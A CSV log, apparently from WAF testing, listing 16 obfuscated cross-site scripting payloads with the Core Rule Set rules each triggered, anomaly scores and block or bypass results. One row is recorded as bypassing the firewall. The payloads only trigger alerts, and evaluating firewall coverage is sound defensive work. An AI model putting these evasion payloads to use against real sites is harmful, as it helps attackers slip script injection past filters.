index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
1,"<audio src onerror=Function('eval(String.fromCharCode(97,108,101,114,116,40,49,41))')()>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o27,55v221,88 || o29,5v221,88 || o27,5v221,88t:removeWhitespace || v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,7v221,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,5v221,88t:htmlEntityDecode,t:jsDecode || ",30,176482687756.979093
2,"<audio><source onerror=""((function(){var a=atob('YWxlcnQoMSk=');eval(a);})())""></audio>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o64,7v221,87 || o26,11v221,87 || o25,11v221,87t:removeWhitespace || v221,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v221,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o43,5v221,87t:htmlEntityDecode,t:jsDecode || ",30,176482688168.158787
3,"<details ontoggle=""(()=>{new Function('al'+'ert(1)')()})()"" open></details>",0,1,block,6,"934100,934100,941100,941160,941390,949110","o25,13v221,75 || o25,13v221,75t:urlDecodeUni || v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,75t:htmlEntityDecode,t:jsDecode || ",25,176482688431.955270
4,<details ontoggle=(Function('\u0061\u006c\u0065\u0072\u0074(1)'))() open></details>,0,1,block,5,"920540,941100,941160,941390,949110","v158,10o29,6v221,83 || v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,6v221,83t:htmlEntityDecode,t:jsDecode || ",20,176482688753.796890
5,<details ontoggle=(Function('al'+'ert(1)'))() open>,0,1,bypass,2,"941100,941160","v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v220,51t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482689024.110727
6,"<details ontoggle=(Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,40,0x31,41)))() open>",0,1,block,5,"934100,934100,941100,941160,949110","o28,19v221,94 || o27,19v221,94t:removeWhitespace || v221,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,176482689312.310501
7,<details ontoggle=(Function(atob('YWxlcnQoMSk=')))() open></details>,0,1,block,4,"941100,941160,941390,949110","v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,5v221,68t:htmlEntityDecode,t:jsDecode || ",15,176482689616.879790
8,<details ontoggle=(function(){window['ale'+'rt'](1)})() open>,0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o19,11v221,61 || o19,11v221,61t:urlDecodeUni || o18,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,18v221,61t:urlDecodeUni,t:compressWhitespace || ",30,176482689940.882935
9,<details ontoggle=Function(atob('YWxlcnQoMSk='))() open></details>,0,1,block,4,"941100,941160,941390,949110","v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,18v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o27,5v221,66t:htmlEntityDecode,t:jsDecode || ",15,176482690274.113473
10,"<details open ontoggle=""(function(){const f=window['\u0061lert'];f(String.fromCharCode(88,83,83))})()""></details>",0,1,block,7,"920540,934100,934100,934100,941100,941370,949110","v158,10o52,6v221,113 || o25,11v221,113 || o25,11v221,113t:jsDecode || o23,11v221,113t:removeWhitespace || v221,113t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o44,20v221,113t:urlDecodeUni,t:compressWhitespace || ",30,176482690558.313063
11,"<details open ontoggle=""(function(){var a='a'+'lert';window[a](1)})();"">",0,1,block,6,"934100,934100,934100,941100,941370,949110","o25,11v221,72 || o25,11v221,72t:urlDecodeUni || o23,11v221,72t:removeWhitespace || v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,9v221,72t:urlDecodeUni,t:compressWhitespace || ",25,176482690899.953952
12,"<details open ontoggle=""(function(){var a='al'+String.fromCharCode(101)+'rt';window[a](1);})();"">",0,1,block,6,"934100,934100,934100,941100,941370,949110","o25,11v221,97 || o25,11v221,97t:urlDecodeUni || o23,11v221,97t:removeWhitespace || v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,9v221,97t:urlDecodeUni,t:compressWhitespace || ",25,176482691119.530503
13,"<details open ontoggle=""(function(){var a='co';var b='nfirm';eval(a+b+'(1)')})()"">",0,1,block,7,"933160,934100,934100,934100,941100,941390,949110","o61,13v221,82 || o25,11v221,82 || o25,11v221,82t:urlDecodeUni || o23,11v221,82t:removeWhitespace || v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o61,5v221,82t:htmlEntityDecode,t:jsDecode || ",30,176482691497.998841
14,"<details open ontoggle=""(function(){var a=String.fromCharCode(0x61,0x6c,0x65,0x72,0x74);window[a](1);})()"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,107 || o23,11v221,107t:removeWhitespace || v221,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o88,9v221,107t:urlDecodeUni,t:compressWhitespace || ",20,176482691693.521133
15,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a]('XSS')})()"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,104 || o23,11v221,104t:removeWhitespace || v221,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,104t:urlDecodeUni,t:compressWhitespace || ",20,17648269190.931171
16,"<details open ontoggle=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();"">",0,1,block,5,"934100,934100,941100,941370,949110","o25,11v221,102 || o23,11v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o82,9v221,102t:urlDecodeUni,t:compressWhitespace || ",20,176482692295.599163
